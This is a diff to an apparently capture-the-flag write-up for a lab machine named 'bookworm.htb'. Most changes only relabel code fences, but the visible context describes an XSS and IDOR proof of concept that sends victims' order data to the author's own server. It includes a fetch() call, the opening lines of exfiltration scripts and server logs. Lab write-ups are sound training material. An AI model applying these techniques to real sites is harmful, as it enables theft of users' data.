@@ -92,7 +92,7 @@ fetch("http://bookworm.htb/profile", { mode: 'no-cors' })
 
 I put this code on `test.txt` and i included file path have malicious code javascript to `Edit notes` but `python3 -m http.server` does not support `POST` response so our created code http.server the usage is same but the difference is this code support `POST` request 
 
-```Response
+```
 python3 post.py
 Starting server on port 8000
 <...snip...>
@@ -160,7 +160,8 @@ Starting server on port 8000
 I've been created POC to create new basket id and inject ou payload into them using the  `IDOR` vulnerability and with `Xss` attack to get order a list of orders from existing users. Xss attack used for sending the orders from existing users to my webserver and i can get the a list of orders victim's basket . The code at the below used for find victim's orders id try one by one id also including with my malicious code javascript and after i running this poc i will got orders id victim.
 
 
-```post.py
+```
+// post.py
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
@@ -184,7 +185,8 @@ if __name__ == "__main__":
 
 
 
-```basket.py
+```
+// basket.py
 import re
 import requests
 
@@ -236,8 +238,8 @@ while True:
 
 To run this code we need running `post.py` and `basket.py`
 
-```Response
- python3 post.py | grep href
+```
+python3 post.py | grep href
 10.10.14.122 - - [23/Jan/2024 07:22:49] "POST / HTTP/1.1" 200 -
 10.10.11.215 - - [23/Jan/2024 07:23:19] "POST / HTTP/1.1" 200 -
       href="/static/css/bootstrap.min.css"
